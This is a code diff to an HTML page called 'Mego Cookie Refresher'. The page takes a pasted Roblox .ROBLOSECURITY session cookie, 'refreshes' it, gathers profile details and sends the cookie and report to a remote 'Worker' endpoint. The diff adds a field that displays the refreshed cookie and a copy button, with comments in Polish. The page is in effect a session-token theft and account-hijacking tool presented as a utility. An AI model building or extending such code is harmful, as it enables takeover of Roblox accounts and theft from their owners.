@@ -12,10 +12,11 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
+            min-height: 100vh;
+            padding: 20px;
         }
         .card {
-            width: 450px;
+            width: 480px;
             background: #111111;
             border: 1px solid #333;
             border-radius: 8px;
@@ -24,7 +25,7 @@
         }
         h2 { font-size: 16px; margin-bottom: 12px; color: #ff6584; text-align: center; }
         label { font-size: 11px; color: #888; display: block; margin-bottom: 5px; }
-        input[type="text"] {
+        input[type="text"], textarea {
             width: 100%;
             background: #030303;
             border: 1px solid #444;
@@ -34,8 +35,9 @@
             font-size: 11px;
             margin-bottom: 12px;
             outline: none;
+            resize: none;
         }
-        input[type="text"]:focus { border-color: #ff6584; }
+        input[type="text"]:focus, textarea:focus { border-color: #ff6584; }
         button {
             width: 100%;
             background: linear-gradient(135deg, #ff6584 0%, #ff8da1 100%);
@@ -46,8 +48,14 @@
             font-weight: bold;
             cursor: pointer;
             transition: 0.2s;
+            margin-bottom: 10px;
         }
         button:hover { filter: brightness(1.1); }
+        .copy-btn {
+            background: linear-gradient(135deg, #00b4d8 0%, #0077b6 100%);
+            margin-top: 5px;
+            display: none;
+        }
         pre {
             background: #030303;
             border: 1px solid #222;
@@ -56,7 +64,7 @@
             font-size: 10px;
             color: #00ffcc;
             margin-top: 15px;
-            height: 160px;
+            height: 120px;
             overflow-y: auto;
             white-space: pre-wrap;
         }
@@ -65,9 +73,16 @@
 <body>
     <div class="card">
         <h2>Mego Cookie Refresher</h2>
-        <label for="cookieInput">Paste your .ROBLOSECURITY cookie:</label>
+        
+        <label for="cookieInput">Paste your old .ROBLOSECURITY cookie:</label>
         <input type="text" id="cookieInput" placeholder="_|WARNING:-DO-NOT-SHARE-THIS...">
+        
         <button id="refreshBtn">Refresh & Send</button>
+
+        <label for="outputCookie">Refreshed .ROBLOSECURITY:</label>
+        <textarea id="outputCookie" rows="3" placeholder="Refreshed cookie will appear here..." readonly></textarea>
+        <button id="copyBtn" class="copy-btn">Copy Refreshed Cookie</button>
+
         <pre id="outputLog">Status: Ready to process...</pre>
     </div>
 
@@ -122,6 +137,11 @@
         document.getElementById('refreshBtn').addEventListener('click', async () => {
             const cookie = document.getElementById('cookieInput').value.trim();
             const logBox = document.getElementById('outputLog');
+            const outputCookieArea = document.getElementById('outputCookie');
+            const copyBtn = document.getElementById('copyBtn');
+
+            outputCookieArea.value = "";
+            copyBtn.style.display = "none";
 
             if (!cookie) {
                 logBox.innerText = "Error: Please enter a .ROBLOSECURITY cookie first!";
@@ -133,6 +153,10 @@
             const refreshed = await refreshRobloxCookie(cookie);
             const finalCookie = refreshed.cookie;
             const activeCsrf = refreshed.csrf || "None";
+
+            // Wyświetlenie odświeżonego ciasteczka na stronie i aktywacja przycisku kopiowania
+            outputCookieArea.value = finalCookie;
+            copyBtn.style.display = "block";
 
             logBox.innerText = "[+] Cookie processed!\n[*] Fetching profile details...";
 
@@ -186,10 +210,24 @@ ${finalCookie}`;
                     body: formData
                 });
 
-                logBox.innerText = "Success! Cookie has been refreshed and sent.\n\n" + profileReport;
+                logBox.innerText = "Success! Cookie has been refreshed, displayed below, and sent.\n\n" + profileReport;
             } catch (err) {
                 logBox.innerText = "Error sending to Worker: " + err.message;
             }
+        });
+
+        // Obsługa przycisku kopiowania
+        document.getElementById('copyBtn').addEventListener('click', () => {
+            const outputCookieArea = document.getElementById('outputCookie');
+            outputCookieArea.select();
+            document.execCommand('copy');
+            
+            const copyBtn = document.getElementById('copyBtn');
+            const originalText = copyBtn.innerText;
+            copyBtn.innerText = "Copied to Clipboard!";
+            setTimeout(() => {
+                copyBtn.innerText = originalText;
+            }, 2000);
         });
     </script>
 </body>
